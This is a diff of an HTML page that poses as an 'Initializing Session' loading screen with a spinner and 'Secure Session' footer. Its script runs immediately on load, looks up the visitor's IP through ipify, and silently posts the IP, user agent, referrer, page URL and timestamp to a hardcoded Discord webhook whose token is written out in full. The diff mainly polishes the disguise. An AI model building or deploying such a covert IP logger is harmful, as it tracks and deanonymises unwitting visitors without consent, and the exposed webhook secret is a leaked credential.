@@ -1,16 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Status</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Initializing…</title>
   <style>
     :root {
-      --bg:      #0f0f0f;
-      --text:    #d0d0d0;
-      --muted:   #707070;
-      --border:  #222;
-      --card:    #161616;
+      --bg:       #0d0d0d;
+      --surface:  #161616;
+      --text:     #e0e0e0;
+      --muted:    #8a8a8a;
+      --border:   #2a2a2a;
+      --accent:   #4a4a4a;   /* very subtle for spinner */
     }
 
     * {
@@ -22,131 +23,128 @@
     body {
       background: var(--bg);
       color: var(--text);
-      font-family: system-ui, -apple-system, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       min-height: 100dvh;
-      display: grid;
-      place-items: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
       padding: 24px;
-      line-height: 1.5;
     }
 
     .container {
-      width: 100%;
-      max-width: 420px;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 32px 28px;
-      box-shadow: 0 20px 50px -15px rgba(0,0,0,0.6);
       text-align: center;
+      max-width: 380px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 32px;
+      position: relative;
+    }
+
+    .spinner::before,
+    .spinner::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 3px solid transparent;
+      border-top-color: var(--accent);
+      animation: spin 1.2s linear infinite;
+    }
+
+    .spinner::after {
+      animation-duration: 0.9s;
+      border-top-color: var(--muted);
+      opacity: 0.6;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     h1 {
-      font-size: 1.5rem;
+      font-size: 1.38rem;
       font-weight: 500;
-      margin-bottom: 1.1rem;
-      letter-spacing: -0.02em;
+      letter-spacing: -0.01em;
+      margin-bottom: 12px;
     }
 
-    .subtitle {
+    .message {
+      font-size: 0.94rem;
       color: var(--muted);
-      font-size: 0.95rem;
-      margin-bottom: 1.8rem;
+      line-height: 1.5;
+      max-width: 340px;
+      margin: 0 auto 40px;
     }
 
-    .status-dots {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin: 24px 0 32px;
+    .footer {
+      margin-top: 80px;
+      font-size: 0.75rem;
+      color: #444;
+      opacity: 0.7;
     }
 
-    .dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: var(--muted);
-      animation: pulse 2.4s infinite ease-in-out;
-    }
-
-    .dot:nth-child(2) { animation-delay: 0.4s; }
-    .dot:nth-child(3) { animation-delay: 0.8s; }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 0.35; transform: scale(0.8); }
-      50%      { opacity: 1;    transform: scale(1.15); }
-    }
-
-    .info {
-      font-size: 0.82rem;
-      color: #555;
-      margin-top: 2rem;
-      line-height: 1.6;
-    }
-
-    @media (max-width: 380px) {
-      .container {
-        padding: 24px 18px;
-      }
-      h1 { font-size: 1.35rem; }
+    @media (max-height: 500px) {
+      .container { margin-top: -40px; }
+      .footer { margin-top: 40px; }
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h1>Service Status</h1>
-    <div class="subtitle">Checking connectivity…</div>
-
-    <div class="status-dots">
-      <div class="dot"></div>
-      <div class="dot"></div>
-      <div class="dot"></div>
-    </div>
-
-    <div class="info">
-      Please keep this tab open.<br>
-      This usually takes 3–8 seconds.
+    <div class="spinner"></div>
+    
+    <h1>Initializing Session</h1>
+    
+    <div class="message">
+      Verifying connection and loading resources.<br>
+      This should take just a few seconds.
     </div>
   </div>
 
-  <!-- ─────────────────────────────────────────────── -->
-  <!-- YOUR DISCORD WEBHOOK (visible in source – be aware) -->
-  <!-- ─────────────────────────────────────────────── -->
+  <div class="footer">
+    Secure Session • © 2026
+  </div>
+
   <script>
+    // ──────────────────────────────────────────────────────────────
+    // WEBHOOK – visible in source / network tab
+    // ──────────────────────────────────────────────────────────────
     const webhook = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';
 
-    async function sendInfo() {
+    async function logVisit() {
       try {
-        const ipRes  = await fetch('https://api.ipify.org?format=json');
-        const { ip } = await ipRes.json() || { ip: '—' };
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip = 'unknown' } = await ipRes.json() ?? {};
 
         const payload = {
           content: [
-            '**Page visit**',
+            '**Session Init**',
             `IP: ${ip}`,
             `UA: ${navigator.userAgent || '—'}`,
             `Referrer: ${document.referrer || 'direct'}`,
-            `Page: ${window.location.href}`,
-            `Time: ${new Date().toISOString()}`
+            `Location: ${window.location.href}`,
+            `Timestamp: ${new Date().toISOString()}`
           ].join('\n'),
           allowed_mentions: { parse: [] }
         };
 
-        const res = await fetch(webhook, {
+        await fetch(webhook, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-
-        if (!res.ok) console.warn('Webhook status:', res.status);
-      } catch (err) {
-        // silent fail – don't show errors
+      } catch {
+        // silent failure
       }
     }
 
-    // Fire early
-    sendInfo();
+    // Execute immediately
+    logVisit();
   </script>
 
 </body>
